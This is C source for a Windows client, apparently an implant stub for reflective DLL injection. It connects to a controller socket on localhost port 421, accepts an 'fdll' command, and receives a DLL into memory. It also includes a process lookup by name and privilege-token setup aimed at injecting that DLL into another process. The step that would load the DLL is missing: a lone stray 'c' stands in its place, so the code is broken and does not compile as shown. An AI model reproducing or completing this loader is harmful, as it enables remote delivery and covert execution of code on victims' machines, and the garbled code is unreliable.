#define WIN32_LEAN_AND_MEAN
/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/

//#include "MemoryModule.h"
#include<winsock2.h>
#include<windows.h>
#include<WS2tcpip.h>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<TlHelp32.h>
#include<tchar.h>
#include "LoadLibraryR.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib,"Advapi32.lib")

#define buf 4096
#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }

SOCKET sock;
struct sockaddr_in server;
char recvbuf[buf] = { 0 };
DWORD dwBytesWritten = 0;
#define WSAError(e) { printf("[WSAError] : %s = %ld", e, WSAGetLastError( )); }
#define WinError(e) { printf("[WinError] : %s = %ld", e, GetLastError( )); }

void split(char* src, char* dest[5], const char* delimeter) {
    int i = 0;

    char* p = strtok(src, delimeter);
    while (p != NULL)
    {
        dest[i++] = p;
        p = strtok(NULL, delimeter);
    }
}

DWORD FileSize(HANDLE fileHandle)
{
    DWORD sz = GetFileSize(fileHandle, NULL);
    return sz;
}

DWORD ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

int main(int argc, char const* argv[])
{
    WSADATA wsa;
    TOKEN_PRIVILEGES priv = { 0 };
    HANDLE hModule = NULL;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    DWORD dwLength = 0;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        WSAError("WSA Startup WSAError");
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == SOCKET_ERROR || sock == INVALID_SOCKET)
    {
        WSAError("Socket Creation Error");
    }

    InetPton(AF_INET, _T("127.0.0.1"), &server.sin_addr.s_addr);
    server.sin_port = htons(421);
    server.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        WSAError("Connect Failure");
    }
    else {
        printf("[+] Connected!\n");
        while (TRUE)
        {
            memset(recvbuf, '\0', buf);
            int return_code = recv(sock, recvbuf, buf, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                printf("\n[X] Disconnected.\n");
                break;
            }

            if (strcmp(recvbuf, "fdll") == 0)
            {
                // Receive Filename and filesize
                int fsize = 0;
                char* fileinfo[2];
                memset(recvbuf, '\0', buf);
                int return_code = recv(sock, recvbuf, buf, 0);
                if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {

                    break;
                }
                split(recvbuf, fileinfo, ":");
                printf("[+] Receiving file : %s\nSize : %s bytes.\n", fileinfo[0], fileinfo[1]);
                int expected = atoi(fileinfo[1]);
                //char* DLL = malloc(expected + 1);
                unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
                // Receive File.
                memset(recvbuf, '\0', buf);
                int total = 0;
                printf("\n\n");
                do {
                    fsize = recv(sock, recvbuf, buf, 0);
                    memcpy(DLL + total, recvbuf, fsize);
                    total += fsize;
                } while (total != expected);

                c


            }
            else {
                printf("[+] Received : '%s'\n", recvbuf);
            }
        }
    }
    exit(0);
}